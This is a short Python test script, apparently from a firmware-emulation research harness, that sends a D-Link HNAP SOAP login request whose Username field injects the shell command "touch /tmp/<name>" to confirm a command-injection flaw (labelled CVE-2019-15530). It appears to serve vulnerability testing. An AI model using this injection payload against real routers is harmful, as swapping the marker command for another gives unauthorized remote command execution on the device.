qemu-user-targets/CVE-2019-15530/tester.py

# Save this file in /Crucibile/analyses/fuzzer/tester.py
import fuzzer
import sys 

payload = f'''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin' && touch /tmp/{sys.argv[3]} #</Username><LoginPassword></LoginPassword><Captcha></Captcha><PrivateLogin>LoginPassword</PrivateLogin></Login></soap:Body></soap:Envelope>'''

fuzzer.TARGET = sys.argv[1]
fuzzer.BRAND  = 'dlink'
x, y = fuzzer.send_hnap_dummy(sys.argv[2], f'/HNAP1/{sys.argv[3]}', data=payload)
print(x, y)
